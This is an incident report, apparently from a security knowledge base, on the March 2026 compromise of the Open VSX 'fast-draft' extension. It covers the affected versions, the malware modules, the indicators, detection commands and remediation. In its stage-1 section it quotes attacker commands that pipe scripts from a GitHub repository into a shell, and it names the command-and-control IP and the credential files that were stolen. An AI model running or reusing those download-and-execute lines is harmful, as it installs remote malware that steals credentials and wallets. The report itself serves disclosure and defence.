# fast-draft Open VSX Extension Compromised by BlokTrooper

**Date:** March 2026
**Ecosystem:** VS Code / OpenVSX
**Severity:** Critical
**Type:** Backdoor / RAT / Infostealer / Clipboard monitor
**Sources:**
- [Aikido Security — fast-draft Open VSX Extension Compromised by BlokTrooper](https://www.aikido.dev/blog/fast-draft-open-vsx-bloktrooper)

---

## Summary

The `KhangNghiem/fast-draft` extension — listed on Open VSX with over 26,000 downloads — had multiple malicious releases that downloaded and executed a full attack framework from the `BlokTrooper/extension` GitHub repository. The confirmed malicious versions are `0.10.89`, `0.10.105`, `0.10.106`, and `0.10.112`. The attack deploys four parallel modules: a Socket.IO remote-access trojan (RAT) with full desktop control, a browser and crypto wallet credential stealer targeting 25+ wallet extensions, a recursive file exfiltration module, and a clipboard surveillance module.

The alternating presence of malicious versions interspersed among clean versions (notably `0.10.111` appears clean between malicious `0.10.106` and `0.10.112`) strongly suggests a **publisher account compromise or stolen publishing token** rather than a malicious maintainer — someone had intermittent access to the release pipeline. As of March 17, 2026, the latest version `0.10.135` was clean, but a disclosure issue filed March 12 remained open with no maintainer response.

---

## Compromised Artifacts

| Extension | Malicious Versions |
|-----------|------------------|
| `KhangNghiem.fast-draft` (Open VSX) | 0.10.89, 0.10.105, 0.10.106, 0.10.112 |

Total downloads: 26,594 (at time of disclosure)
Stage-1 payload host: `raw.githubusercontent.com/BlokTrooper/extension`
C2 IP: `195.201.104.53` (ports 6931, 6936, 6939)

---

## How It Worked

### Stage 1: GitHub-hosted Downloader

All malicious versions reach out to `raw.githubusercontent.com/BlokTrooper/extension` and pipe the response directly into a shell. In `0.10.89`, the extension fetches platform-specific scripts:

```bash
curl https://raw.githubusercontent.com/BlokTrooper/extension/refs/heads/main/scripts/linux.sh | sh
curl https://raw.githubusercontent.com/BlokTrooper/extension/refs/heads/main/scripts/mac.sh | sh
curl https://raw.githubusercontent.com/BlokTrooper/extension/refs/heads/main/scripts/windows.cmd | cmd
```

In `0.10.105`, `0.10.106`, and `0.10.112`, the loader is wrapped as an `icons/${platform}` fetch tied to extension activation. The scripts download ZIP archives, extract them to a temp directory, and launch a bundled Node binary against an obfuscated payload.

### Stage 2: Four-Module Attack Framework

One launcher script starts **four detached Node child processes** (`windowsHide: true, detached: true`) so they persist independently in the background:

**Module 1 — Remote Desktop RAT** (connects to `195.201.104.53:6931` via Socket.IO)
- Mouse movement, clicks, and scrolling
- Keypress injection
- Screenshot capture with JPEG compression
- Clipboard read/write
- Screen dimension lookup and system profiling
- VM detection (checks for VMware, VirtualBox, QEMU, KVM, Xen) — labels host but continues execution

**Module 2 — Browser and Crypto Wallet Stealer** (uploads to `195.201.104.53:6936`)
- Walks Chrome, Edge, Brave, Opera, and LT Browser profiles on macOS/Linux/Windows
- Steals `Login Data`, `Login Data For Account`, `Web Data`, and LevelDB wallet extension state
- Targets 25 crypto wallet extensions including MetaMask, Phantom, TronLink, Trust Wallet, Coinbase Wallet, OKX, Solflare, Rabby, Keplr, UniSat, Enkrypt, Bitget, SafePal, TON Wallet, and more
- On macOS also steals `~/Library/Keychains/login.keychain`
- Polls for new LevelDB files every ~100 seconds for ongoing wallet state exfiltration

**Module 3 — File and Secret Exfiltration**
- Recursively scans the home directory (all drives on Windows) for: `*.docx`, `*.xlsx`, `*.pdf`, `*.env*`, `*.pem`, `*.secret`, SSH keys, source files, images
- Explicitly targets AI coding environments: `.cursor`, `.claude`, `.windsurf`, `.pearai`
- Skips only noisy paths: `node_modules`, `.git`, `dist`, `build`, `AppData`

**Module 4 — Clipboard Surveillance** (sends to `/api/service/makelog`)
- Polls clipboard every few seconds; submits changed content to C2
- Platform-specific: `pbpaste` (macOS), `powershell Get-Clipboard` (Windows), `clipboardy` (Linux)
- Designed to capture seed phrases, API keys, passwords, and recovery codes copied but never written to disk

The C2 IP is reconstructed at runtime from obfuscated integer fields (never stored as a plain string), and runtime errors are silenced with `process.on('uncaughtException', ()=>{})`. A singleton PID lock under `~/.npm/` prevents multiple instances.

---

## Timeline

| Date | Event |
|------|-------|
| Before 0.10.89 | Versions through 0.10.88 appear clean |
| Mar 2026 (approx) | First malicious release 0.10.89 introduces GitHub-hosted downloader |
| Mar 2026 (approx) | 0.10.105, 0.10.106 — loader moved to extension activation; one-time guard added/removed |
| Mar 2026 (approx) | 0.10.111 — clean (malicious loader absent) |
| Mar 2026 (approx) | 0.10.112 — malicious; startup downloader returns |
| 2026-03-12 | Aikido discloses to maintainer via GitHub issue #565 (no response at time of writing) |
| 2026-03-17 | Latest version 0.10.135 confirmed clean; Aikido publishes full analysis |
| 2026-03-18 | StepSecurity confirms related React Native npm package compromise |

---

## Detection

```bash
# Check which version of fast-draft is installed
code --list-extensions --show-versions | grep fast-draft

# Block the C2 IP at firewall level
# 195.201.104.53 ports 6931, 6936, 6939

# Check for the singleton lock file
ls ~/.npm/__tmp__/ 2>/dev/null

# Check for staged credential files
ls ~/.npm/__tmp__/cldbs/ 2>/dev/null

# Check for downloaded ZIP temp payload
ls /tmp/ | grep -E "^[a-z0-9]{8}$"

# Network: scan for outbound Socket.IO connections to 195.201.104.53
netstat -an | grep "195.201.104.53"
lsof -i @195.201.104.53 2>/dev/null

# Check for the GitHub-hosted payload host in extension source
grep -r "BlokTrooper\|raw.githubusercontent.com/BlokTrooper" \
  ~/.vscode/extensions/khangnghiem.fast-draft-*/
```

---

## Remediation

1. **Uninstall** the `fast-draft` extension if on any of the malicious versions (0.10.89, 0.10.105, 0.10.106, 0.10.112). Update to a version ≥ 0.10.129 if the extension is needed.
2. **Rotate all browser-saved passwords** and any credentials that may have been stored in browser profiles.
3. **Rotate all crypto wallet seed phrases** and move funds to new wallets — the module polls LevelDB state continuously.
4. **Revoke and rotate API keys, SSH keys, and cloud credentials** stored anywhere on the developer machine.
5. **Block C2** at DNS/firewall: IP `195.201.104.53`, ports 6931, 6936, 6939.
6. **Check for persistence artifacts**: `~/.npm/__tmp__/`, singleton PID lock, and any background `node` processes.
7. **Audit clipboard history** for any sensitive data that may have been copied while the extension was active.

---

## Lessons Learned

- The alternating clean/malicious version pattern across a single extension's release history is a strong signature of a compromised publisher token rather than a rogue maintainer — this pattern can be used as a detection heuristic.
- Targeting AI coding environment configuration directories (`.cursor`, `.claude`, `.windsurf`) shows threat actors are actively adapting to the modern developer toolchain.
- Open VSX lacks the same security review infrastructure as the VS Code Marketplace; extensions published there carry elevated supply chain risk.
- A four-module persistent attack framework with independent detached processes is qualitatively different from a simple credential dump — it provides ongoing access even after the malicious extension is removed.
- The `curl | sh` pattern in extension activation code is an unambiguous indicator of compromise and should trigger automated rejection in marketplace review pipelines.

---

## Related Incidents

- [./2026-03-glassworm-canisterworm.md](./2026-03-glassworm-canisterworm.md) — GlassWorm/CanisterWorm, another OpenVSX attack with similar RAT capabilities
- [./2025-08-nx-build-system.md](./2025-08-nx-build-system.md) — VS Code extension + npm compromise (NX Build System)
